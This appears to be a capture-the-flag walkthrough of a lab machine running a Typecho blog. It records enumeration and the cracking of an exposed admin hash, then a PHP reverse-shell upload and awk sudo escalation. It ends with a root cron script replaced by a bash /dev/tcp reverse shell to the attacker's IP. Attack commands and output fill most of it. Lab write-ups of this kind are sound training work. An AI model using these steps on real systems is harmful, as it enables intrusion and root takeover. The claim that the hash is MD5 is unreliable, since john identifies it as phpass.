@@ -1,1 +1,456 @@
+			ENUMERATION
+			
 
+---nmap---
+
+                                                                                              
+┌──(root㉿kali)-[/home/okina]
+└─# nmap 10.0.2.53 -sS -sC -sV -A -T4 -p-    
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-09 23:09 +03
+Nmap scan report for 10.0.2.53
+Host is up (0.00078s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 36:32:5b:78:d0:f4:3c:9f:05:1a:a7:13:91:3e:38:c1 (RSA)
+|   256 72:07:82:15:26:ce:13:34:e8:42:cf:da:de:e2:a7:14 (ECDSA)
+|_  256 fc:9c:66:46:86:60:1a:29:32:c6:1f:ec:b2:47:b8:74 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Zacarx's blog
+|_http-generator: Typecho 1.2.1
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+MAC Address: 08:00:27:FB:1C:31 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.78 ms 10.0.2.53
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 40.06 seconds
+   
+
+
+
+---I check the website and it is all in chinese, I use a firefox translate extension to understand the website 
+better. Let's run web enum using gobuster---
+
+
+
+                                                                                              
+┌──(root㉿kali)-[/home/okina]
+└─# gobuster dir -u http://10.0.2.53 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x html,txt,php,sql
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.0.2.53
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              html,txt,php,sql
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/index.php            (Status: 200) [Size: 6752]
+/.html                (Status: 403) [Size: 274]
+/.php                 (Status: 403) [Size: 274]
+/admin                (Status: 301) [Size: 306] [--> http://10.0.2.53/admin/]
+/install              (Status: 301) [Size: 308] [--> http://10.0.2.53/install/]
+/install.php          (Status: 302) [Size: 0] [--> http://10.0.2.53/]
+/sql                  (Status: 301) [Size: 304] [--> http://10.0.2.53/sql/]
+/LICENSE.txt          (Status: 200) [Size: 14974]
+/var                  (Status: 301) [Size: 304] [--> http://10.0.2.53/var/]
+/usr                  (Status: 301) [Size: 304] [--> http://10.0.2.53/usr/]
+/.php                 (Status: 403) [Size: 274]
+/.html                (Status: 403) [Size: 274]
+/server-status        (Status: 403) [Size: 274]
+Progress: 1102800 / 1102805 (100.00%)
+===============================================================
+Finished
+===============================================================
+     
+
+
+
+---we see there is a login page for admin and other numerous files, let's keep on looking---
+
+
+
+
+---after checking the pages I notice that in /usr page there is a database file, I decide to download it, maybe
+we can get some credentials---
+
+
+
+---To check a database file content we can use SQLite Database browser that comes built in with kali, after doing 
+so we select the typechousers option in the app and see that there is a password filter for the admin user,
+it looks like a hash, I check for it on hash.com and it is indeed a MD5 hash---
+
+
+
+---let's crack it using john---
+
+
+                                                                                              
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/ZA1 LINUX CTF]
+└─# echo '$P$BERw7FPX6NWOVdTHpxON5aaj8VGMFs0' > admin_hash.txt                            
+                                                                                              
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/ZA1 LINUX CTF]
+└─# john admin_hash.txt                                     
+Using default input encoding: UTF-8
+Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 SSE2 4x3])
+No password hashes left to crack (see FAQ)
+                                                                                              
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/ZA1 LINUX CTF]
+└─# john admin_hash.txt --show
+?:123456
+
+1 password hash cracked, 0 left
+          
+
+
+
+---found the password for admin user which is 123456, let's go to the webpage and login as admin---
+
+
+
+
+---In the website we see that admin can upload files and more, when we try to upload a file we fail first.
+But we can go to the settings page to change this. In this page we also see that there's a domain name
+for this website, za1.hmv. We add it to the dns system--- 
+
+
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# nano /etc/hosts                      
+                                                                                              
+┌──(root㉿kali)-[/home/okina]
+└─# cat /etc/hosts
+127.0.0.1	localhost
+127.0.1.1	kali
+
+10.0.2.22	midnight.coffee dev.midnight.coffee
+10.0.2.53	za1.hmv
+.
+.
+.
+
+
+
+
+---Then we come to the write page, select appendix and upload a php file, I upload rev.php---
+
+---After that it gives us a link for the file, it created this for me
+
+http://za1.hmv/usr/uploads/2024/05/604134496.php
+
+then we create an article with it. Now it is published---
+
+
+---now start our listener on the port that our rev.php file uses---
+
+
+                                                                                              
+┌──(root㉿kali)-[/home/okina]
+└─# nc -lnvp 4444  
+listening on [any] 4444 ...
+
+
+
+---go to the adress your php file was published---
+
+
+
+
+
+			GAINING FOOTHOLD
+			
+
+┌──(root㉿kali)-[/home/okina]
+└─# nc -lnvp 4444  
+listening on [any] 4444 ...
+connect to [10.0.2.15] from (UNKNOWN) [10.0.2.53] 34964
+Linux za_1 4.15.0-213-generic #224-Ubuntu SMP Mon Jun 19 13:30:12 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
+ 21:05:00 up 58 min,  0 users,  load average: 0.00, 0.01, 0.26
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+
+$ python3 -c 'import pty;pty.spawn("/bin/bash")';
+www-data@za_1:/home$ whoami
+whoami
+www-data
+
+
+---we gain our first foothold, let's look around---
+
+
+www-data@za_1:/home$ cd /home
+cd /home
+www-data@za_1:/home$ ls
+ls
+za_1
+
+www-data@za_1:/home$ cd z	
+cd za_1/
+www-data@za_1:/home/za_1$ ls
+ls
+user.txt
+
+www-data@za_1:/home/za_1$ cat user	
+cat user.txt 
+---First User Flag---
+			
+
+
+
+---we gain our first flag, keep on looking for more clues for permissions and how to priv escalate---	
+
+
+
+www-data@za_1:/home/za_1$ sudo -l
+sudo -l
+Matching Defaults entries for www-data on za_1:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on za_1:
+    (za_1) NOPASSWD: /usr/bin/awk
+
+
+
+
+---found an awk priv escalate exploit, a quick visit to gtfobins and found a priv escalate vector---
+
+www-data@za_1:/home/za_1$ sudo -u za_1 /usr/bin/awk 'BEGIN {system("/bin/sh")}'
+<do -u za_1 /usr/bin/awk 'BEGIN {system("/bin/sh")}'
+
+$ whoami
+whoami
+za_1
+
+
+---now we are za_1 user---
+
+
+---looking at the home directory---
+
+za_1@za_1:/home$ cd z	
+cd za_1/
+
+za_1@za_1:~$ ls -la
+ls -la
+total 52
+drwxr-xr-x 8 za_1 za_1 4096 May  9 21:19 .
+drwxr-xr-x 3 root root 4096 Jul 26  2023 ..
+lrwxrwxrwx 1 za_1 za_1    9 Aug 22  2023 .bash_history -> /dev/null
+-rw-r--r-- 1 za_1 za_1  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 za_1 za_1 3771 Apr  4  2018 .bashrc
+drwx------ 2 za_1 za_1 4096 Jul 26  2023 .cache
+drwxr-x--- 3 za_1 za_1 4096 May  9 21:19 .config
+drwx------ 3 za_1 za_1 4096 May  9 21:19 .gnupg
+drwxr-xr-x 3 za_1 za_1 4096 May  9 21:16 .local
+-rw-r--r-- 1 za_1 za_1  807 Apr  4  2018 .profile
+drwxr-xr-x 2 za_1 za_1 4096 Jul 26  2023 .root
+drwx------ 2 za_1 za_1 4096 Jul 26  2023 .ssh
+-rw-r--r-- 1 za_1 za_1    0 Jul 26  2023 .sudo_as_admin_successful
+-rw------- 1 za_1 za_1  991 Jul 26  2023 .viminfo
+-rw-r--r-- 1 za_1 za_1   23 Jul 26  2023 user.txt
+
+
+---.root dir picks my interest---
+
+
+za_1@za_1:~$ cd .root
+cd .root
+za_1@za_1:~/.root$ ls -la
+ls -la
+total 12
+drwxr-xr-x 2 za_1 za_1 4096 Jul 26  2023 .
+drwxr-xr-x 8 za_1 za_1 4096 May  9 21:19 ..
+-rwxrwxrwx 1 root root  117 Jul 26  2023 back.sh
+
+
+
+za_1@za_1:~/.root$ cat back.sh
+cat back.sh
+#!/bin/bash
+
+
+cp /var/www/html/usr/64c0dcaf26f51.db /var/www/html/sql/new.sql
+
+bash -i >&/dev/tcp/10.0.2.18/999 0>&1
+
+
+
+---okay, this dude is probably a script run by root on a timer basis, kind of like a cron job, if
+we can edit the content of it maybe we can escalate our privileges---
+
+
+---I tried nano to change the content, didn't work, I tried copying it to another file to edit it and
+then move it back, didn't work either. Let's use pspy64 to monitor the processes, maybe we can get a clue---
+
+
+za_1@za_1:~/.ssh$ cd /tmp
+
+za_1@za_1:/tmp$ wget http://10.0.2.15:8000/pspy64
+wget http://10.0.2.15:8000/pspy64
+--2024-05-09 21:24:41--  http://10.0.2.15:8000/pspy64
+Connecting to 10.0.2.15:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3104768 (3.0M) [application/octet-stream]
+Saving to: 'pspy64'
+
+pspy64              100%[===================>]   2.96M  --.-KB/s    in 0.06s   
+
+2024-05-09 21:24:41 (52.0 MB/s) - 'pspy64' saved [3104768/3104768]
+
+
+za_1@za_1:/tmp$ ls
+linpeas.sh  pspy64  tmux-1000
+
+
+za_1@za_1:/tmp$ chmod +x pspy64
+chmod +x pspy64
+
+za_1@za_1:/tmp$ ./pspy64
+./pspy64
+pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
+
+
+     ██▓███    ██████  ██▓███ ▓██   ██▓
+    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
+    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
+    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
+    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
+    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
+    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
+    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
+                   ░           ░ ░     
+                               ░ ░     
+
+Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
+Draining file system events due to startup...
+done
+2024/05/09 21:30:53 CMD: UID=1000  PID=21064  | ./pspy64 
+2024/05/09 21:30:53 CMD: UID=0     PID=21038  | 
+2024/05/09 21:30:53 CMD: UID=0     PID=20956  | 
+2024/05/09 21:30:53 CMD: UID=1000  PID=10934  | gpg-agent --homedir /home/za_1/.gnupg --use-standard-socket --daemon 
+2024/05/09 21:30:53 CMD: UID=0     PID=6446   | /usr/lib/lxd/lxd --group lxd --logfile=/var/log/lxd/lxd.log 
+2024/05/09 21:30:53 CMD: UID=1000  PID=2868   | /bin/bash 
+2024/05/09 21:30:53 CMD: UID=1000  PID=2867   | python3 -c import pty;pty.spawn("/bin/bash") 
+.
+.
+.
+
+2024/05/09 22:11:18 CMD: UID=0     PID=2      | 
+2024/05/09 22:11:18 CMD: UID=0     PID=1      | /sbin/init maybe-ubiquity 
+2024/05/09 22:12:01 CMD: UID=0     PID=21654  | /bin/bash -i 
+2024/05/09 22:12:01 CMD: UID=0     PID=21653  | /bin/bash /home/za_1/.root/back.sh 
+
+
+
+
+---yep, just like I thought the back.sh file is being run. So we need to find a way to edit it or since
+it becomes a pain in the ass we can upload another file named back.sh that has a reverse shell in it---
+
+
+
+
+			
+			PRIVILEGE ESCALATION
+
+
+
+---write the script in our kali machine---
+
+                                                                                                                  
+┌──(root㉿kali)-[/home/okina/]
+└─# echo '/bin/bash -i >& /dev/tcp/10.0.2.15/5050 0>&1' > back.sh
+                                                                  
+
+
+---go to the target machine, delete the back.sh and download the new one---
+
+
+za_1@za_1:~/.root$ rm back.sh
+rm back.sh
+
+za_1@za_1:~/.root$ wget http://10.0.2.15:8000/back.sh
+wget http://10.0.2.15:8000/back.sh
+--2024-05-09 22:09:54--  http://10.0.2.15:8000/back.sh
+Connecting to 10.0.2.15:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 45 [text/x-sh]
+Saving to: 'back.sh'
+
+back.sh             100%[===================>]      45  --.-KB/s    in 0.001s  
+
+2024-05-09 22:09:54 (66.7 KB/s) - 'back.sh' saved [45/45]
+
+
+
+---set up our listener---
+
+┌──(root㉿kali)-[/home/okina/]
+└─# nc -lnvp 5050
+listening on [any] 5050 ...
+
+
+
+---you can wait a litle bit, or run the pspy64 from the target machine---
+
+
+za_1@za_1:~/.root$ cd /tmp
+cd /tmp
+za_1@za_1:/tmp$ ./pspy64
+./pspy64
+pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
+
+
+     ██▓███    ██████  ██▓███ ▓██   ██▓
+    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
+    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
+    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
+    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
+    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
+    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
+    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
+                   ░           ░ ░     
+                               ░ ░     
+
+
+
+
+---check our netcat---
+
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/ZA1 LINUX CTF]
+└─# nc -lnvp 5050
+listening on [any] 5050 ...
+connect to [10.0.2.15] from (UNKNOWN) [10.0.2.53] 39432
+bash: cannot set terminal process group (21618): Inappropriate ioctl for device
+bash: no job control in this shell
+root@za_1:~# cd /root
+cd /root
+
+root@za_1:~# ls
+ls
+root.txt
+
+
+root@za_1:~# cat root.txt
+cat root.txt
+---Root User Flag---
